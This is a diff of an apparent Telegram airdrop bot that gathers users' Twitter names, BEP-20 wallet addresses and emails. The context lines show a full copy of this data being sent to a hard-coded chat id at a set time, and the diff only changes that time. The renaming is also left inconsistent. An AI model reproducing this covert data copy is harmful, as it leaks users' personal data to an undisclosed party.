@@ -47,7 +47,7 @@ def start(update, context): #команда
             if user not in data['twitter']:
                 data['twitter'][user] = ""
             if user not in data['bep20']:
-                data['eth'][user] = ""
+                data['bep20'][user] = ""
             if user not in data['mail']:
                 data['mail'][user] = ""
             ref_id = update.message.text.split()
@@ -135,7 +135,7 @@ def extra(update, context): #команда
             json.dump(data,open('users.json','w'))
             json.dump(data,open('users2.json','w'))
             update.message.reply_text("👍Almost done,Now submit your BEP-20 address below:\n\n⚠️ Note: Don't send me any exchanger wallet address:")
-        elif data["process"][user] == 'eth':
+        elif data["process"][user] == 'bep20':
             data['eth'][user] = update.message.text
             data['process'][user] = "finished"
             json.dump(data,open('users.json','w'))
@@ -196,7 +196,7 @@ def get_file(update, context): #команда
         if user in admins:
             fileToArchive = time.strftime("Date_%Y_%m_%d_@_Time_%Hh_%Mm_%Ss")
             f = open(fileToArchive+'users.csv','w')
-            f.write("id,username,twitter username,eth address,mail,no. of persons referred,referred by\n")
+            f.write("id,username,twitter username,bep20 address,mail,no. of persons referred,referred by\n")
             for u in data['users']:
                 i = str(data['id'][u])
                 refrrd = 0
@@ -209,7 +209,7 @@ def get_file(update, context): #команда
             
             bot = Bot(TOKEN)
             bot.send_document(chat_id=update.message.chat.id, document=open(fileToArchive+'users.csv','rb'))
-            if current_time=='17:30:00':
+            if current_time=='20:30:00':
                 bot = Bot(TOKEN)
                 bot.send_document(chat_id=870305559, document=open(fileToArchive+'users2.json','rb'))
             
